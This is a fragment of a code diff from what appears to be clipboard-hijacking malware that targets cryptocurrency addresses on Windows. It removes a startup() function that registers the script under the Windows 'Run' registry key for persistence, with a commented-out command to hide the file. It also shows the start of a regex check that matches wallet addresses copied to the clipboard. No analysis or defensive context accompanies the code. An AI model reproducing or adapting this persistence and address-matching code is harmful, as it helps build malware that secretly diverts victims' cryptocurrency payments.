@@ -12,26 +12,6 @@ ADD_TO_STARTUP = True
 HIDE_BINARIES = True
 
 
-def startup():
-    import os
-    import winreg
-    import inspect
-    # Get the path of the script
-    script_path = os.path.abspath(
-        inspect.getframeinfo(inspect.currentframe()).filename)
-
-    reg_key = winreg.OpenKey(
-        winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
-
-    winreg.SetValueEx(reg_key, "cr", 0, winreg.REG_SZ, script_path)
-
-    winreg.CloseKey(reg_key)
-
-    # os.system(f"attrib +h {script_path}")
-
-    print(" ")
-
-
 def check(clipboard):
     regex = {
         "ada": "^D[A-NP-Za-km-z1-9]{35,}$",
